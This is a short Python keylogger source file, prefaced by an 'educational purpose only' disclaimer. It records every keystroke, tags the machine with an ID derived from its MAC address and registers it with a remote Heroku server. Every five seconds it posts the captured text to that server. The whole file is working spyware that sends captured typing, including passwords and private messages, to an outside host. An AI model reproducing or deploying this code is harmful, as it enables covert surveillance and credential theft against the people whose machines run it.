"""By using this code, written partially in PHP and Python, you agree that you will use it for educational purpose only and in case you use it for some illegal activity,
the author will not be responsible for it."""

# Importing the required modules
import threading
import keyboard
import requests
import time

from uuid import getnode as get_mac

# These are constant throughout the execution
CHARMAP = {
    "shift" : "",
    "right shift" : "",
    "enter" : "\n",
    "backspace" : "⌫",
    "space" : " ",
    "ctrl": " ctrl-",
    "tab": ""
    }
URL = "http://py3keylogger.herokuapp.com" # "http://127.0.0.1:5000"#
START_TIME = time.time()
CONDITION = True

try:
    DEVICE_ID = open("device_id").read()
except:
    file = open("device_id", "w")
    file.write(str(get_mac()))
    file.close()
    DEVICE_ID = open("device_id").read()
    requests.get(f"{URL}/register?device_id=" + DEVICE_ID)

# These changes with each iteration
prev_data = ""
new_data = ""
typed_string = ""

# Event thread
def sendinfo():
    global prev_data, typed_string, CONDITION
    # Applying my very own, state change detecting algorithm
    while CONDITION:
        try:
            # Checking for new data
            new_data = typed_string
            if prev_data != new_data and new_data != "":
                # If there is new data, sending it to server
                print("Sending data:", new_data)

                json = {
                    "device_id": DEVICE_ID,
                    "data": new_data
                }
                # print(new_data)
                requests.post(f"{URL}/log", headers={"Content-Type":"application/json"}, json=json)
                
                # Clearing the sent data from memory
                typed_string = typed_string.replace(new_data, "", 1)
                prev_data = new_data
            time.sleep(5)
        
        # Sleeping for 5 seconds to reduce load on server
        except Exception as e:
            # Catching and logging any error
            print("Error:", e)
            time.sleep(5)

def main():
    global CONDITION, typed_string
    #This is the main loop which handles the reading part of key-strokes
    while True:
        # Reading the key-strokes
        key = keyboard.read_key()
        if key == "esc":
            print("Ended")
            CONDITION = False
            break
        try:
            # Comparing it with predefined sets of key-strokes
            pressed = CHARMAP[key]
            # Storing the data in memory
            typed_string = typed_string + pressed
            
        except:
            typed_string = typed_string + key
            
        # Sleeping minutely to reduce load on machine
        time.sleep(0.15)

# Starting the event thread
thread = threading.Thread(target=sendinfo)
thread.start()

# Starting the mainloop
main()
